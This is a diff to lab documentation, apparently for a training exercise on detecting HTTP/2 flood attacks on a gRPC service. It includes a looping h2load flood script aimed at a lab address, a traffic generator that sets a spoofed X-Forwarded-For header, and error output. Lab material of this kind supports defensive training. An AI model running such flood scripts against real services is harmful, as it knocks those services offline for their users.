@@ -37,7 +37,7 @@ Generate legitimate traffic
    curl -b cookiefile -c cookiefile -L -s -o /dev/null  -A "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3" -H "X-Forwarded-For: 3.3.3.3" http://${IP}:${PORT}/${URI} &
 
 
-3. Run the good traffic shell script:
+3. Run the good traffic shell script and keep it running:
 
 ``./good.sh``
     
@@ -56,17 +56,17 @@ Start HTTP/2 Flood attack
    1. Back in the UDF, click 'Access' on the **Attacker** VM and select WebShell
 
 .. code-block:: bash
-   caption: http2flood.sh
-
+   :caption: http2flood.sh
+   
    #!/bin/sh
    while true; do
       h2load -n 10000 -c 1000 http://10.1.1.4:500/routeguide.RouteGuide/GetFeature
    done
 
 
-2. Run the http2 flood script:
+2. Run the http2 flood script for 15 seconds and keep it running:
 
-``. /scripts/http2flood.sh``
+``./scripts/http2flood.sh``
 
 Attack script Output
 
@@ -103,4 +103,5 @@ Attack script Output
         details = "Received http2 header with status: 502"
         debug_error_string = "{"created":"@1650395963.222837020","description":"Received http2 :status header with non-200 OK status","file":"src/core/ext/filters/http/client/http_client_filter.cc","file_line":134,"grpc_message":"Received http2 header with status: 502","grpc_status":14,"value":"502"}"
 
-4. Stop the HTTP2Flood attack, by pressing Ctrl-C
+4. Stop the HTTP2Flood attack running on the Attacker host by pressing CTRL+C
+5. On the legitimate traffic WebShell, press CTRL+C to exit the script
